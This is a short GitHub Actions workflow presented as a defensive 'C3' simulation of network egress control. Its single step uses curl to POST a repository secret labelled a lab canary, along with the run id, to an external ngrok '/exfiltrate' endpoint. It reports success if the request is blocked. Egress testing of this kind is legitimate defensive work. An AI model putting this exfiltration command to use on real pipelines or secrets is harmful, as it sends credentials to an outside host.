name: Defense C3 Simulation (Network Egress Control)
on: [workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Attempt Egress with Strict Firewall Simulation
        env:
          LAB_CANARY: ${{ secrets.LAB_CANARY }}
        run: |
          # If egress proxy/firewall blocks external non-whitelisted domains:
          curl --max-time 5 -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
            -H "Content-Type: application/json" \
            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"C3\"}" || echo "Egress blocked successfully."
